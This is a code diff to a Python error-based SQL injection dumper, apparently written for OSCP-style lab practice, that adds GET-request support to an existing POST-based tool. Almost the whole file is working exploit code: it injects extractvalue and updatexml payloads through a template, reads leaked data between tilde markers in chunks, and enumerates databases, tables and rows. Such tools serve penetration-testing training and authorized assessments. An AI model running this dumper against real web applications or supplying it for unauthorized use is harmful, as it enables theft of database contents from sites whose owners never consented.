@@ -6,6 +6,7 @@
 # substring(...,pos,CHUNK) between two 0x7e (~) markers and stitches chunks.
 # Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
 # Uses the group_concat pattern (one query per column, no LIMIT loop).
+# Supports GET (param in query string) and POST (param in body).
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
 # ---------------------------------------------------------------------------
 import requests
@@ -18,20 +19,40 @@ CHUNK = 20
 
 # --- Interactive config ----------------------------------------------------
 print("=== error-based SQLi dumper ===")
-URL          = input("Target URL : ").strip()
-INJ_FIELD    = input("Injectable POST field name (e.g. username) : ").strip()
-OTHER_FIELD  = input("Other POST field name (e.g. password) : ").strip()
-OTHER_VALUE  = input("Other field value (anything, e.g. x) : ").strip()
-
+METHOD       = input("Request method GET or POST                   : ").strip().upper()
+if METHOD not in ("GET", "POST"):
+    METHOD = "POST"
+URL          = input("Target URL                                   : ").strip()
+INJ_FIELD    = input("Injectable field name (e.g. username / id)   : ").strip()
+# Second field only matters for POST logins (e.g. password). Leave blank for a
+# single-parameter endpoint such as GET /post?id=1.
+OTHER_FIELD  = input("Other field name (blank if none)             : ").strip()
+OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() if OTHER_FIELD else ""
 # Template with [INJECT] where the extractvalue() expression is spliced in.
-# Example that worked in testing: kitty' AND [INJECT]-- -
-TEMPLATE = input("Payload template (use [INJECT] as placeholder): ").strip()
+# POST login example: kitty' AND [INJECT]-- -
+# GET numeric example: 1 AND [INJECT]-- -
+TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
 
 # MySQL system schemas to skip when dumping "all" (still listed on screen)
 SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
 # Match the data between our two ~ markers (non-greedy = closest pair).
 MARK = re.compile(r"~(.*?)~", re.S)
+
+# --- Request sender (GET -> query string, POST -> body) --------------------
+def send(payload):
+    """Send one payload with the configured method and return the response.
+    GET puts the injectable field (and optional second field) in the query
+    string; POST puts them in the form body."""
+    if METHOD == "GET":
+        params = {INJ_FIELD: payload}
+        if OTHER_FIELD:
+            params[OTHER_FIELD] = OTHER_VALUE
+        return requests.get(URL, params=params)
+    data = {INJ_FIELD: payload}
+    if OTHER_FIELD:
+        data[OTHER_FIELD] = OTHER_VALUE
+    return requests.post(URL, data=data)
 
 # --- Core leak (beats the 32-char cap) -------------------------------------
 def leak(subquery, label=None):
@@ -48,7 +69,7 @@ def leak(subquery, label=None):
         # fallback if extractvalue is filtered:
         # expr = f"updatexml(1,concat(0x7e,substring(({subquery}),{pos},{CHUNK}),0x7e),1)"
         payload = TEMPLATE.replace("[INJECT]", expr)
-        r = requests.post(URL, data={INJ_FIELD: payload, OTHER_FIELD: OTHER_VALUE})
+        r = send(payload)
 
         m = MARK.search(r.text)
         if m:
@@ -78,6 +99,7 @@ if not _ver:
     print("[!] Oracle FAILED: no data leaked in the response.")
     print("    The error text is probably NOT reflected on the page.")
     print("    Error-based needs the visible ~... message; use blind instead.")
+    print(f"    method   = {METHOD}")
     print(f"    template = {TEMPLATE!r}")
     sys.exit(1)
 print(f"[+] Oracle works. version = {_ver}\n")
